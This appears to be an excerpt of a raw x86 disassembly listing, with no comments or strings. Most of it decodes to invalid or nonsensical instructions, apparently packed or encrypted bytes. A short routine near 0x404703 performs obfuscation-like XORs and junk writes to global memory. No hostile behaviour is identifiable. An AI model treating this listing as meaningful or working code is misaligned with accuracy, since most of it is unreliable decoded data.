  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4235cf,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4235d7,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4235d7,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0xbbb687ea
  4047be:	push   ebp
  4047bf:	xchg   edx,eax
  4047c0:	jle    0x404840
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [ebx]
  4047d5:	mov    cl,0x8
  4047d7:	(bad)  
  4047d9:	bswap  eax
  4047db:	adc    BYTE PTR [edi],dh
  4047dd:	sbb    BYTE PTR [edi],bl
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
